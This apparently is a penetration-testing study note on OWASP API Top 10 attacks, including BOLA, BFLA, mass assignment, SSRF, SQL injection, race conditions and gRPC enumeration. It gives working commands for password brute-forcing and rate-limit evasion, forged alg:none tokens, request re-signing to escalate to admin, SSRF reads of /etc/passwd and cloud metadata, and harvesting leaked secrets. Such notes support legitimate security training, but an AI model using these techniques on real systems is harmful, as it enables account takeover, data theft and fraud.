# API Attacks

#OWASP-API #BOLA #IDOR #Authentication #SSRF #SQLInjection #Authorization #RateLimiting #MassAssignment #WebAPI #gRPC #Protobuf #RequestSigning

## What is this?

Attacks on RESTful APIs targeting the OWASP API Security Top 10 — object-level and function-level auth bypass, data exposure, credential compromise, resource exhaustion, SSRF, injection, and poor inventory management. Unlike traditional web app attacks, API flaws are exploited through direct HTTP calls without a browser UI, often returning unfiltered JSON that exposes structure. Pairs with [[Server-Side Attacks]], [[SQL Injection]], [[Web Attacks]].

> [!note] A high-value concrete instance of every flaw here is a **SCIM** user-provisioning API (`/scim/v2/Users`) — bearer-token CRUD, BOLA on user IDs, mass-assignment ATO via `userName`/`active`: [[Standards & Protocols/SCIM|SCIM]].

> [!note] **Protocol reference** — for *why* these design properties are attackable (the concept side): [[Standards & Protocols/REST|REST]] (client-supplied IDs → BOLA, stateless tokens, verb tampering), [[Standards & Protocols/JSON|JSON]] (schemaless bodies → mass assignment / type confusion), and [[Standards & Protocols/SOAP|SOAP]] (the XML/WSDL/WS-Security API style — same authz bugs, plus XXE).

---

## Tools

| Tool | Use |
|---|---|
| `curl` / [[Tools/Web/Burpsuite\|Burp Suite]] | Manual API requests, JWT token inspection, response body analysis |
| [[Tools/Scanning/ffuf\|ffuf]] | Brute-force API parameters (user IDs, email+password pairs, file IDs, endpoint discovery) |
| [[Tools/Web/jwt_tool\|jwt_tool]] | Decode/tamper JWTs — `alg:none`, algorithm confusion, weak-secret cracking |
| [[Tools/Database/SQLMap\|sqlmap]] | Automate the SQL-injection-in-API-endpoints testing |
| `jq` | Parse and filter JSON responses, extract specific fields from API dumps |
| [CyberChef](https://gchq.github.io/CyberChef/) | Decode base64 payloads, encode/decode tokens, analyze obfuscated data |
| [Swagger UI](https://swagger.io/tools/swagger-ui/) | Explore API endpoints, test RBAC, inject payloads directly in the UI |
| [[Tools/Web/Burpsuite\|Burp Scanner]] | Automated API scanning, crawling, active checks |
| [OpenAPI generator tools](https://openapi-generator.tech/) | Convert OpenAPI/Swagger specs into client code for easier testing |
| [grpcurl](https://github.com/fullstorydev/grpcurl) | curl for gRPC — enumerate services via server reflection, call methods with JSON |
| `protoc` | Protobuf compiler; `--decode_raw` reads an unknown protobuf blob with no `.proto` |

---

## Reconnaissance: API Enumeration & Fingerprinting

Before exploiting, map the entire API surface and identify the tech stack.

### Endpoint Discovery

```bash
# Extract endpoints from Swagger/OpenAPI spec
curl -s "http://<api>/swagger/v1.json" | jq '.paths | keys'
curl -s "http://<api>/openapi.json" | jq '.paths | keys'

# Common API path patterns — fuzz for hidden endpoints
ffuf -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -u "http://<api>/api/FUZZ" -mc 200,401,403

# Brute-force common endpoint names
for endpoint in users admin products orders settings config debug test export; do
  curl -s "http://<api>/api/v1/$endpoint" | jq '.error' 2>/dev/null && echo "Found: $endpoint"
done

# Extract endpoints from JavaScript / source maps
curl -s "http://<api>/assets/app.js.map" | jq '.sources' | grep -oP '/api/[^"]*'
```

### Tech Stack Fingerprinting

```bash
# Check response headers for framework signatures
curl -i "http://<api>/api/v1/health" | grep -iE "Server|X-Powered-By|X-AspNet-Version"
# Output: X-AspNet-Version: 4.0.30319 → .NET
#         Server: nginx → nginx (often used with Node/Python)

# Error messages reveal the framework
curl "http://<api>/api/v1/users/nonexistent'" 2>&1 | head -20
# Look for: "ASP.NET", "Django", "Flask", "Express", "Spring", etc.

# Behavioral fingerprinting
# Test response to invalid JSON
curl -X POST "http://<api>/api/v1/test" \
  -H "Content-Type: application/json" \
  -d '{invalid json}'
# Different frameworks parse/reject differently

# Check if API version is in response headers or body
curl -s "http://<api>/api/v1/health" | jq '.version'
curl -i "http://<api>/api/v1/health" | grep -i version
```

---

## gRPC & Protobuf APIs

Everything above assumes JSON over HTTP/1.1. Internal and mobile-backend services increasingly speak **gRPC** — protobuf over HTTP/2 — where the request body is binary, there are no URL parameters to tamper, and Burp shows you nothing useful until it is decoded. The vulnerability classes are unchanged (BOLA, BFLA, mass assignment all apply); only the transport and tooling differ.

**Recognising it:**

| Tell | Meaning |
|---|---|
| `content-type: application/grpc` | Native gRPC over HTTP/2 |
| `content-type: application/grpc-web` / `-web-text` | **grpc-web** — browser-compatible, runs over HTTP/1.1, so it proxies through Burp normally (`-text` is base64) |
| Path shaped `/package.Service/Method` | gRPC routing — the "endpoint" is a service+method, not a REST path |
| `grpc-status` / `grpc-message` response headers | Errors ride headers, not the body — a `200` can still be a failure |
| Binary body, no JSON | Protobuf wire format |

### Enumerate via Server Reflection

If reflection is enabled (common on internal services), the API documents itself — no spec hunting required:

```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services, then methods on one, then a method's full signature
grpcurl -plaintext <TARGET_IP>:<PORT> list
grpcurl -plaintext <TARGET_IP>:<PORT> list my.package.AccountService
grpcurl -plaintext <TARGET_IP>:<PORT> describe my.package.AccountService.GetAccount

# Dump the .proto definitions straight out of reflection — your offline map of the API
grpcurl -plaintext -proto-out-dir ./protos <TARGET_IP>:<PORT> describe my.package.AccountService

# Call a method (JSON in, JSON out — grpcurl handles the protobuf encoding)
grpcurl -plaintext -d '{"id": 1234}' <TARGET_IP>:<PORT> my.package.AccountService/GetAccount

# Authenticated call; -H repeats for multiple headers
grpcurl -plaintext -H 'authorization: Bearer <token>' -d '{"id": 1234}' <TARGET_IP>:<PORT> my.package.AccountService/GetAccount

# TLS variants: drop -plaintext for TLS; -insecure skips cert validation; -cert/-key for mTLS
grpcurl -insecure -d '{"id":1234}' <TARGET_IP>:443 my.package.AccountService/GetAccount
grpcurl -cert client.pem -key client.key <TARGET_IP>:443 list
```

> [!tip] `-msg-template` prints a skeleton request for a method, which beats guessing field names:
> ```bash
> grpcurl -plaintext -msg-template <TARGET_IP>:<PORT> describe my.package.AccountService.GetAccount
> ```

### When Reflection Is Disabled

```bash
# 1. Find the .proto or descriptor set in the client — mobile APKs and JS bundles ship them
unzip -o app.apk -d apk/ && find apk/ -name '*.proto' -o -name '*.pb' -o -name '*.protoset'

# 2. Drive grpcurl from those files instead of reflection
grpcurl -import-path ./protos -proto account.proto -plaintext <TARGET_IP>:<PORT> list
grpcurl -protoset ./api.protoset -plaintext <TARGET_IP>:<PORT> list

# 3. No schema at all? Decode a captured body structurally — field numbers + wire types,
#    enough to spot an id/role field worth tampering.
protoc --decode_raw < captured_body.bin
```

> [!note] **BOLA is the same bug here, just harder to see.** `GetAccount{id: 1234}` is exactly `GET /accounts/1234` — increment the id and check whether another tenant's object comes back. Because the field names come from the `.proto`, reflection also hands you the **mass-assignment** candidates for free: any field in the request message that the UI never sets (`role`, `is_admin`, `account_type`) is worth submitting.

> [!warning] Reflection being enabled in production is itself a finding (**API9 / API8** — it exposes the full internal service surface), but it is an *information disclosure*, not authorization. Don't report it as a critical on its own; report what it let you reach.

### Non-REST Surfaces — Where to Go Next

| Surface | Note |
|---|---|
| GraphQL endpoint (`/graphql`) | [[Intro to GraphQL]] for the model, [[GraphQL Attacks]] for the offensive toolkit |
| WebSocket / subscription channels | [[Techniques/WebSockets\|WebSockets]] |
| SOAP / XML endpoints | [[Standards & Protocols/SOAP\|SOAP]] |

---

## Testing Methodology: Structured API Audit Workflow

A repeatable workflow to systematically test an API:

1. **Reconnaissance** — Enumerate endpoints, fingerprint tech stack, identify auth method
2. **Authentication** — Test weak credentials, bypass attempts, token manipulation
3. **Authorization** — BOLA/IDOR, BFLA, role-based access control
4. **Data Exposure** — Excessive data, sensitive fields in responses
5. **Data Manipulation** — Mass assignment, race conditions, state modification
6. **Resource Limits** — Unrestricted uploads, rate-limiting, DOS
7. **Injection** — SQL, command, template, SSRF, path traversal
8. **Logic Flaws** — Business logic bypass, pricing manipulation, discount abuse
9. **Caching** — Poisoning, header manipulation, stale data
10. **Chaining** — Combine findings for greater impact

```bash
# Phase 1: Auth & Roles
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/roles/current-user" | jq '.roles'

# Phase 2: Enumerate all endpoints and test each with current JWT
curl -s "http://<api>/swagger.json" | jq -r '.paths | keys[]' | while read endpoint; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $JWT" "http://<api>$endpoint")
  echo "$endpoint: $status"
done

# Phase 3: Test each endpoint for BOLA (swap IDs)
# Phase 4: Check data exposure (are sensitive fields returned?)
# Phase 5: Test data modification (PATCH/POST with extra fields)
# Phase 6: Fuzz for injection in every string parameter
```

---

## BOLA / IDOR (Broken Object Level Authorization)

An authenticated user can access another user's data by guessing or iterating object IDs (UUIDs, integers) — the API checks you're *authenticated* but not that you *own* the resource.

### Identify

Parameters that reference object IDs: URL paths (`/suppliers/{ID}`, `/reports/{ID}`), query strings (`?userID=`, `?companyID=`). Test whether you can swap someone else's ID and still retrieve their data.

```bash
# Get your own data first
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/suppliers/current-user"
# Response contains your companyID: abc-123-def

# Try accessing another company's report by ID
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/supplier-companies/yearly-reports/1"
# If you get back a report for a *different* companyID, BOLA confirmed

# Mass exploit — iterate all IDs
for ((i=1; i<=20; i++)); do
  curl -s -H "Authorization: Bearer $JWT" \
    "http://<api>/api/v1/supplier-companies/yearly-reports/$i" | jq
done
```

> [!tip]
> Integer IDs are easier to brute-force than UUIDs. Start with small integers (1-100); if nothing works, check Burp history to see what IDs the app actually uses.

---

## Broken Authentication

The API fails to enforce rate-limiting on login/password-reset endpoints, or uses weak password policies, making credential brute-force feasible.

> [!note] The web-login view of these same flaws — user enumeration, credential stuffing, MFA/reset abuse — is in [[Class notes/HTB Academy/CWES Claude/Broken Auth|Broken Auth]]; brute-force tradecraft in [[Class notes/HTB Academy/CPTS v2 (claude)/Login Brute Forcing|Login Brute Forcing]] and [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]].

### Weak Password Policy

```bash
# Test password requirements
curl -X PATCH "http://<api>/api/v1/customers/current-user" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"password":"pass"}'
# Response: "Password must be at least 6 characters"

# If accepted passwords are only 6+ chars, brute-force is realistic
curl -X PATCH "http://<api>/api/v1/customers/current-user" \
  -H "Authorization: Bearer $JWT" \
  -d '{"password":"123456"}'
# If accepted → password policy is weak
```

### Brute-Force Login (No Rate-Limiting)

Identify the failure message from a failed login first:

```bash
curl -X POST "http://<api>/api/v1/authentication/customers/sign-in" \
  -H "Content-Type: application/json" \
  -d '{"Email":"victim@example.com","Password":"wrong"}'
# Response: {"error":"Invalid Credentials"}
```

Fuzz email + password pairs:

```bash
# Save target emails to a file
cat > emails.txt << EOF
victim1@example.com
victim2@example.com
EOF

# Fuzz passwords against those emails
ffuf -w /opt/SecLists/Passwords/xato-net-10-million-passwords-10000.txt:PASS \
  -w emails.txt:EMAIL \
  -u "http://<api>/api/v1/authentication/customers/sign-in" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"Email":"EMAIL","Password":"PASS"}' \
  -fr "Invalid Credentials" \
  -t 100
```

> [!tip]
> The `-fr` filter removes responses that match the *failure* message, leaving only successful logins visible.

### Rate-Limiting Bypass

If the login endpoint is rate-limited, try rotation techniques:

```bash
# User-Agent rotation
for pass in password1 password2 password3; do
  curl -X POST "http://<api>/api/v1/authentication/customers/sign-in" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    -d "{\"Email\":\"victim@example.com\",\"Password\":\"$pass\"}"
done

# X-Forwarded-For spoofing (if API uses this for rate-limit keying)
for pass in password1 password2 password3; do
  curl -X POST "http://<api>/api/v1/authentication/customers/sign-in" \
    -H "X-Forwarded-For: 192.168.$((RANDOM % 256)).$((RANDOM % 256))" \
    -d "{\"Email\":\"victim@example.com\",\"Password\":\"$pass\"}"
done

# Distributed attack via multiple source IPs (proxy chain)
# If you have proxies or can rotate IPs, send requests in parallel from different origins
```

> [!warning]
> Rate-limit bypass on authentication is illegal without authorization. Only test on authorized targets.

### JWT / Token Attacks

Inspect and manipulate JWT tokens to escalate privileges or reuse tokens across services.

> [!note] Full JWT attack methodology (algorithm confusion, `kid`/`jwks` injection, key cracking) in [[Techniques/JWT Attacks|JWT Attacks]] with [[Tools/Web/jwt_tool|jwt_tool]]; the token model behind it in [[Techniques/OAuth-OIDC-SAML|OAuth-OIDC-SAML]].

```bash
# Decode a JWT — it's base64URL (uses -_ instead of +/, no = padding),
# so plain `base64 -d` often errors "invalid input" on real tokens.
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
# Robust decode — translate to std base64 and let jq handle padding:
echo $TOKEN | cut -d. -f1 | jq -R 'gsub("-";"+")|gsub("_";"/")|@base64d|fromjson'  # header
echo $TOKEN | cut -d. -f2 | jq -R 'gsub("-";"+")|gsub("_";"/")|@base64d|fromjson'  # payload (claims)

# Look for role claims, user IDs, expiry
# Example claims: {"sub":"user123","role":"admin","exp":1720000000}

# Algorithm confusion (if API accepts alg=none)
# Craft a JWT with no signature — some APIs accept this for "public" operations
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"attacker","role":"admin"}
# Signature: (empty)
# Result: eyJhbGciOiJub25lIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.

# Test if API accepts it
curl -H "Authorization: Bearer <crafted-token>" \
  "http://<api>/api/v1/admin/endpoint"

# Token reuse — same JWT across multiple services
# If your API and a partner API share the same secret key
STOLEN_TOKEN="eyJhb..."
curl -H "Authorization: Bearer $STOLEN_TOKEN" \
  "http://partner-api.example.com/api/v1/profile"
```

> [!tip]
> Use [jwt.io](https://jwt.io) to decode/inspect tokens visually (but never paste real tokens into public tools). Check the `exp` claim to see if it's expired, and the `iat`/`nbf` claims for timing attacks.

---

### Signed Requests (HMAC) — When Tampering Breaks Everything

Some APIs sign each request, so the moment you change *any* parameter the server answers `401 invalid signature`. This is the most common reason a tester wrongly concludes an API is not vulnerable to BOLA or mass assignment: **the authorization bug is still there, you just can't reach it until you can re-sign.**

**Tells:** an `X-Signature` / `X-Hmac` / `sign` / `hash` header or query param, usually alongside a `timestamp` and sometimes a `nonce`.

```http
POST /api/v2/transfer HTTP/1.1
X-Timestamp: 1758499200
X-Nonce: 8f14e45f
X-Signature: 6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e
```

**Work it in this order:**

1. **Find the key.** Client-side signing means the key ships with the client — decompile the mobile app (`apktool d app.apk`, then grep for the header name) or search the JS bundle. A signing key recoverable from the client is *itself* the finding; see [[#API Key & Credential Leakage]].
2. **Work out the canonical string.** Usually some concatenation of method, path, sorted query, body, and timestamp. The client code tells you the exact order and separators.
3. **Re-sign automatically** so normal testing resumes — wrap it rather than computing hashes by hand:

```python
# Minimal re-signer — adapt the canonical string to what the client actually does
import hashlib, hmac, time, requests

KEY = b"<key recovered from the client>"

def signed(method, path, body=""):
    ts  = str(int(time.time()))
    msg = f"{method}\n{path}\n{body}\n{ts}".encode()      # ← match the client's format exactly
    sig = hmac.new(KEY, msg, hashlib.sha256).hexdigest()
    return {"X-Timestamp": ts, "X-Signature": sig}

body = '{"account_id": 1234, "role": "admin"}'               # now tamper freely
print(requests.post("https://<api>/api/v2/transfer", data=body,
                    headers=signed("POST", "/api/v2/transfer", body)).text)
```

**Then test the signing scheme itself** — it fails more often than the crypto suggests:

| Weakness | Test |
|---|---|
| Signature doesn't cover everything | Sign a valid request, then change a field that *isn't* in the canonical string (often the body, or a header) — if it's accepted, tamper that field freely with the original signature |
| No replay protection | Resend a captured signed request verbatim. Still works an hour later? No timestamp window. Works twice? No nonce tracking |
| Signature not actually verified | Send a syntactically valid but wrong signature, an **empty** one, and the header **removed entirely** — all three get skipped surprisingly often |
| Truncated / non-constant-time compare | A server comparing only the first N chars accepts many forgeries |
| Delimiter-free concatenation | If the canonical string is `a+b` with no separator, `("12","34")` and `("1","234")` sign identically — move a character across a field boundary to forge |

> [!tip] Test "is it verified at all" **first** — it is the cheapest check and it short-circuits the whole key-recovery effort when the answer is no.

---

## Excessive Data Exposure (Broken Object Property Level Authorization)

The API returns sensitive fields to users who shouldn't see them — PII, internal IDs, email addresses, phone numbers in responses meant for public consumption.

### Identify

```bash
# Check what fields are in a supposedly "public" API response
curl -s "http://<api>/api/v1/suppliers" | jq '.[] | keys'
# If output includes: ["id", "companyID", "name", "email", "phoneNumber"]
# BUT should only be: ["id", "name"]
# → Excessive Data Exposure

# Compare with what the UI shows (often fewer fields)
# Proof: customers can now directly contact suppliers, bypassing marketplace fees
```

---

## Race Conditions

Two concurrent requests reach the API simultaneously, bypassing checks that assume sequential execution (e.g., balance checks, duplicate prevention, stock limits).

### Identify

```bash
# Scenarios vulnerable to race conditions:
# - Purchase with balance check
# - Duplicate order prevention
# - Stock deduction
# - Coupon reuse limits

# Send two requests in parallel (not sequentially)
seq 1 2 | parallel -j 2 'curl -X POST "http://<api>/api/v1/purchase" \
  -H "Authorization: Bearer $JWT" \
  -d "{\"item_id\":\"abc\",\"quantity\":1}"'

# If both succeed when they shouldn't (e.g., both deduct from same balance)
# or if a unique constraint is bypassed → race condition

# Exploit: drain balance, claim coupon twice, buy unlimited stock
```

### Exploitation Example

```bash
# Attacker account has $10 balance
# Attacker sends 11 parallel purchase requests for $1 each
# Race condition: all 11 requests pass balance check before any deduction
# Result: $10 balance → $0, but 11 items purchased

# Send requests in parallel using GNU parallel or xargs
for i in {1..11}; do
  echo "curl -X POST 'http://<api>/api/v1/purchase' \
    -H 'Authorization: Bearer $JWT' \
    -d '{\"product_id\":\"xyz\",\"price\":1}'"
done | parallel -j 11
```

> [!warning]
> Race condition exploits can cause financial loss or inventory desync. Only test on authorized, non-production systems.

---

## Mass Assignment (Broken Object Property Level Authorization)

The API accepts fields in PATCH/PUT requests that the user shouldn't be able to modify (roles, pricing, discount flags, exemption status, admin flags).

### Identify

```bash
# Check the GET response to see what fields exist
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/supplier-companies/current-user" | jq
# Response includes: {"isExemptedFromMarketplaceFee": false, ...}

# Try to modify it in a PATCH request
curl -X PATCH "http://<api>/api/v1/supplier-companies" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"SupplierCompanyID":"abc-123","isExemptedFromMarketplaceFee":1}'
# If the API accepts it and updates the field → Mass Assignment

# Verify the change took effect
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/supplier-companies/current-user" | jq '.isExemptedFromMarketplaceFee'
# Output: 1 (now exempt from fees)
```

> [!tip]
> Enumerate all fields from GET responses, then try submitting them in PATCH/PUT bodies. The API might accept fields it shouldn't.

---

## Unrestricted Resource Consumption

File upload/download endpoints don't validate size or file type, allowing disk exhaustion or malware distribution.

### Large File Upload

```bash
# Create a large junk file with .pdf extension
dd if=/dev/urandom of=huge.pdf bs=1M count=100

# Upload it
curl -X POST "http://<api>/api/v1/supplier-companies/certificates-of-incorporation" \
  -H "Authorization: Bearer $JWT" \
  -F "file=@huge.pdf" \
  -F "CompanyID=abc-123"
# If accepted without size validation → repeat 10+ times to fill disk
```

### Malicious File Type

```bash
# Create a fake .exe
dd if=/dev/urandom of=shell.exe bs=1M count=10

# Upload it masquerading as a PDF
curl -X POST "http://<api>/api/v1/supplier-companies/certificates-of-incorporation" \
  -H "Authorization: Bearer $JWT" \
  -F "file=@shell.exe" \
  -F "CompanyID=abc-123"
# If accepted → file may be executable or accessible to admins

# Check if it's publicly accessible
curl -s "http://<api>/SupplierCompaniesCertificatesOfIncorporations/shell.exe" \
  -o shell.exe
```

> [!warning]
> Only do this on authorized targets. Filling disk or uploading actual malware is destructive and illegal without explicit consent.

---

## Broken Function Level Authorization (BFLA)

An endpoint requires a role (e.g. `ProductDiscounts_GetAll`), but the API doesn't actually check it — anyone can call the endpoint.

### Identify

```bash
# Check your roles
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/roles/current-user"
# Response: [] (no roles, or roles don't include ProductDiscounts_GetAll)

# Try calling the protected endpoint anyway
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/products/discounts"
# If it returns data despite you not having the role → BFLA
```

---

## Unrestricted Access to Sensitive Business Flows (API6:2023)

The endpoint is technically authorized, but the *business flow* behind it can be automated at a scale the business never intended — bulk-buying limited stock for resale, mass-creating accounts, spamming invites, scraping the full catalog. Each individual request is legitimate; the abuse is volume + automation, so there's no broken authz check to point at.

### Identify

```bash
# Flows worth automating (real-world value when scripted):
#  - purchase/checkout  → scalping limited stock
#  - account/invite create → spam, referral/discount abuse
#  - comment/review    → reputation manipulation
#  - search/pagination → full catalogue scrape

# Test: can the flow be scripted with no CAPTCHA / device check / velocity limit?
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $JWT" -X POST "http://<api>/api/v1/checkout" \
    -d '{"item_id":"limited-drop","qty":1}'
done
# All 100 succeed with no throttling/CAPTCHA → API6
```

> [!note]
> API6 is about the *rate of legitimate use*, not a broken auth check — mitigations are business-flow controls (CAPTCHA, device fingerprinting, velocity limits), not just authorization.

---

## HTTP Method Override

The API filters certain HTTP methods (DELETE blocked, but POST allowed). Bypass by telling the server to treat POST as DELETE via a header or parameter.

```bash
# X-HTTP-Method-Override header
curl -X POST "http://<api>/api/v1/products/123" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $JWT"
# Server interprets as DELETE instead of POST

# _method parameter in POST body
curl -X POST "http://<api>/api/v1/products/123" \
  -d "_method=DELETE&id=123" \
  -H "Authorization: Bearer $JWT"

# Custom header variations (try if above don't work)
# X-Method-Override, X-Real-Method, HTTP-Method-Override
```

> [!tip]
> Useful when DELETE/PATCH are blocked at the WAF/load-balancer level but POST passes through. Often works on APIs that were retrofitted with method restrictions.

---

## SSRF via Controlled File Paths

The API accepts a file path or URL parameter and serves it back. Abuse it to read local files (`/etc/passwd`) or access internal services.

### File Scheme SSRF

```bash
# The API has a field like certificateURI that you can modify via PATCH
curl -X PATCH "http://<api>/api/v1/supplier-companies" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"SupplierCompanyID":"abc-123","CertificateOfIncorporationPDFFileURI":"file:///etc/passwd"}'

# Now fetch the certificate (which points to /etc/passwd)
curl -H "Authorization: Bearer $JWT" \
  "http://<api>/api/v1/supplier-companies/abc-123/certificates-of-incorporation" | jq '.base64Data'
# Decode the base64 to read /etc/passwd
echo "<base64-string>" | base64 -d
```

### Webhook / Callback SSRF

The API accepts a webhook URL that it will POST to later (for notifications, payment confirmations, etc.). Abuse it to make the server SSRF to internal resources.

```bash
# Register a webhook pointing at internal service
curl -X POST "http://<api>/api/v1/webhooks" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"EventType":"order.paid","CallbackURL":"http://127.0.0.1:8080/admin"}'

# Trigger the event (place an order, complete a payment, etc.)
# The API will POST to your CallbackURL
# If it's internal, you'll receive the response or can exfil data

# Attacker-controlled URL to receive the callback
# Listen on your server
nc -lnvp 9000
# Or use Burp Collaborator, interactsh to capture the request

# Internal resource access via webhook
# Point webhook at cloud metadata
curl -X POST "http://<api>/api/v1/webhooks" \
  -d '{"CallbackURL":"http://169.254.169.254/latest/meta-data/"}'
# The API server will fetch this and may log/return the response
```

> [!tip]
> Webhooks are often logged or their responses are stored/displayed to admins. Even if you don't see the response immediately, check logs/admin panels later.

---

## SQL Injection in API Endpoints

User-controlled parameters (especially substring searches) land directly in SQL queries without parameterization.

### Identify

```bash
# Normal request
curl "http://<api>/api/v1/products/laptop/count"
# Response: {"productsCount": 18}

# Inject a quote to break syntax
curl "http://<api>/api/v1/products/laptop%27/count"
# Response: {"errorMessage": "An error has occurred!"}
# If error changes → potential SQL injection

# Exploit — OR 1=1 to return all records
curl "http://<api>/api/v1/products/laptop%27%20OR%201%3D1%20--%20/count"
# Response: {"productsCount": 720} (all products in table, not just laptops)
```

> [!tip]
> URL-encode single quotes (`%27`), spaces (`%20`), and comment markers (`--` → `%2D%2D`).

### CORS Misconfiguration

The API sets `Access-Control-Allow-Origin: *` or trusts attacker-controlled origins, allowing cross-origin requests from malicious pages.

```bash
# Check CORS headers in API response
curl -i "http://<api>/api/v1/data" \
  -H "Origin: https://attacker.com"
# Look for: Access-Control-Allow-Origin: https://attacker.com (or *)
#           Access-Control-Allow-Credentials: true

# If both are set to allow attacker origin + credentials, exploit it:
# 1. Attacker hosts malicious JS on attacker.com
# 2. Victim visits attacker.com
# 3. JS makes authenticated request to API using victim's browser credentials
# 4. API allows it because CORS allows attacker.com
# 5. Attacker can read/modify victim's data

# Proof-of-concept: check if wildcard + credentials = CORS misconfiguration
curl -i -X OPTIONS "http://<api>/api/v1/data" \
  -H "Origin: https://anything.com" \
  -H "Access-Control-Request-Method: POST"
# If response includes Access-Control-Allow-Origin: * (or your origin)
# AND Access-Control-Allow-Credentials: true
# → Misconfigured (these two should not both be set to allow all)
```

> [!warning]
> `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` is a contradiction that browsers don't allow, but some APIs may set them anyway. The key risk is `*` origin paired with sensitive operations.

### Caching Abuse

Misconfigured cache headers allow attackers to poison responses or extract cached sensitive data.

```bash
# Check cache headers
curl -i "http://<api>/api/v1/user/profile" -H "Authorization: Bearer $JWT" | grep -i cache

# Look for: Cache-Control: public (PII should be private)
#           Expires: (future date)
#           no-cache, no-store (good)

# Cache poisoning: set a header that influences cache key, then poison it
curl -X POST "http://<api>/api/v1/comment" \
  -H "X-Forwarded-Host: attacker.com" \
  -d '{"text":"<script>alert(1)</script>"}'

# If the API caches based on Host header and returns the same cached response
# to all users, you've poisoned the cache globally

# Extract cached sensitive data
curl "http://<api>/api/v1/users/123" \
  -H "Authorization: Bearer $VICTIM_JWT" \
  -H "If-None-Match: stale-etag"
# If server returns 304 Not Modified with cached admin data → information disclosure
```

> [!tip]
> Check Cache-Control, ETag, Last-Modified headers. Private/authenticated endpoints should have `Cache-Control: private, no-cache, no-store`.

---

## Security Misconfiguration (API8:2023)

Missing hardening rather than a single logic flaw: verbose stack traces, permissive CORS, absent security headers, unnecessary HTTP methods enabled, default creds on admin tooling, or unpatched components. Several checks in this note map here — see [[#CORS Misconfiguration]], [[#Caching Abuse]], and [[#HTTP Method Override]].

### Identify

```bash
# Verbose errors leaking stack traces / framework versions
curl -s "http://<api>/api/v1/users/%27" | head

# Missing security headers
curl -sI "http://<api>/api/v1/health" \
  | grep -iE "x-frame-options|content-security-policy|strict-transport|x-content-type"
# absent → misconfiguration

# Unnecessary methods enabled (TRACE, PUT, DELETE on a read endpoint)
curl -s -X OPTIONS "http://<api>/api/v1/users" -i | grep -i "^allow"

# Debug/admin surfaces reachable (also see API Key & Credential Leakage below)
curl -s "http://<api>/api/v1/debug/config"
```

---

## API Key & Credential Leakage

API keys, tokens, and secrets often leak in plain sight — error messages, logs, source maps, public repos, or debug endpoints.

### Common Leakage Vectors

```bash
# Error messages revealing keys
curl "http://<api>/api/v1/config" 
# Response: {"error":"Database connection failed: Server=db.internal; Password=secret123"}

# Debug endpoints
curl "http://<api>/api/v1/debug/config" 
curl "http://<api>/api/v1/health/extended"
curl "http://<api>/admin/settings"

# Source maps exposing API keys in comments/strings
curl -s "http://<api>/assets/app.js.map" | strings | grep -iE "api.?key|secret|password|token"

# Git repos exposed
curl -s "http://<api>/.git/config"
# If accessible → clone the repo and grep for credentials
git clone "http://<api>/.git" && grep -r "password\|secret\|key" .git

# Public cloud storage misconfiguration
# S3 buckets, Azure blobs exposed with credentials in filenames
curl "http://<api>/api/v1/backup/credentials"

# Environment variable leakage (esp. in Docker/Kubernetes)
curl "http://<api>/api/v1/env" 
curl "http://<api>/api/debug/vars"

# Old/deprecated endpoints still returning keys
curl "http://<api>/api/v0/settings" 
curl "http://<api>/api/v1-legacy/apikeys"
```

### Verify & Exploit Leaked Keys

```bash
# Test if leaked key actually works
LEAKED_KEY="sk_live_abc123..."
curl -H "X-API-Key: $LEAKED_KEY" "http://<api>/api/v1/admin/users"

# Check key permissions
curl -H "X-API-Key: $LEAKED_KEY" "http://<api>/api/v1/whoami"
# Response reveals what scopes/roles the key has
```

---

## Improper Inventory Management (Legacy API Versions)

Old API versions (v0, v1-beta, deprecated) remain accessible without auth, exposing deleted/legacy data or enabling downgrade attacks.

### Identify

```bash
# Check Swagger UI for multiple API versions in the dropdown
# If v0, v1-beta, etc. exist, test them

# Endpoints in v0 may not have authentication (no lock icon)
curl "http://<api>/api/v0/customers/deleted"
# If this returns data without a JWT → unauthenticated access to sensitive info
```

---

## Unsafe Consumption of APIs

Your API calls another API (third-party service) and trusts its response without validation. Injection or data poisoning can flow through.

### Risk

```bash
# Your API calls: stripe.com/api/charge
# Attacker intercepts/MITM the response
# Your API processes the attacker-supplied data without validation
# → leads to injection, logic bypass, or RCE in your backend
```

**Prevention:** Always validate/sanitize data from external APIs before processing; use HTTPS with cert pinning; implement rate-limiting on the external call.

---

## Chaining Vulnerabilities for Maximum Impact

Real-world exploits rarely rely on a single flaw. Combine multiple low-impact vulnerabilities to escalate privilege or maximize data theft.

```mermaid
flowchart TB
    subgraph C1["Chain 1 — full marketplace compromise"]
        direction LR
        A1["BOLA<br/>enumerate supplier IDs"] --> A2["Mass Assignment<br/>set fee-exempt flag"] --> A3["SSRF<br/>read internal config"] --> A4["Admin creds → takeover"]
    end
    subgraph C2["Chain 2 — fraud + denial of service"]
        direction LR
